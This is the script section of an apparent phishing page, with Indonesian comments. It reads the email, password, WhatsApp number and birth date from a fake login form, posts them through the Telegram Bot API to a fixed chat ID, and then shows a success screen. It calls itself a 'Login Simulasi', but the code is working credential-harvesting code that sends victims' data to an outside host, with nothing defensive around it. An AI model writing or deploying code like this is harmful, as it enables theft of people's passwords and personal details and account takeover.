  <!-- Script -->
  <script>
    const BOT_TOKEN = 'Wak R'; // Ganti dengan token dari @BotFather
    const CHAT_ID = '7228659553';     // Ganti dengan chat ID tujuan

    function showLoginForm() {
      document.getElementById('confirmSection').classList.add('hidden');
      document.getElementById('loginSection').classList.remove('hidden');
    }

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const whatsapp = document.getElementById('whatsapp').value;
      const dob = document.getElementById('dob').value;

      const message = `ðŸ” Login Simulasi\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}\nðŸ“± WhatsApp: ${whatsapp}\nðŸŽ‚ Tanggal Lahir: ${dob}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      })
      .then(res => res.json())
      .then(data => {
        // Sembunyikan form login, tampilkan halaman sukses
        document.getElementById('loginSection').classList.add('hidden');
        document.getElementById('successSection').classList.remove('hidden');
      })
      .catch(err => {
        document.getElementById('statusMsg').textContent = 'Berhasil Mengirim Data.';
      });
    });
  </script>

